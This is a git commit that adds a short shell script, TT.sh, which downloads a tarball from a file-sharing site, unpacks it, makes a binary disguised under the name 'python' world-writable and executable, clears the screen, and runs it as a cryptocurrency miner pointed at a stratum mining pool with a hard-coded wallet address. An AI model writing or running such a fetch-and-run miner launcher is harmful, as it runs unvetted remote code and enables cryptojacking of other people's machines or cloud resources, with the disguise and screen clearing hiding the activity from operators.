f83894aaaaced72b0a955bc212419fa32307404d
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-12 06:36:59 +0700

    Create TT.sh

---
+++ TT.sh
@@ -0,0 +1,11 @@
+wget https://filebin.net/3c01218o9f87ifx2/TT.tar.gz
+
+tar -xvzf TT.tar.gz
+
+cd TT
+
+chmod 777 python
+
+clear
+
+./python -a flex -o stratum+tcp://eu.mpool.live:5205 -u kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu
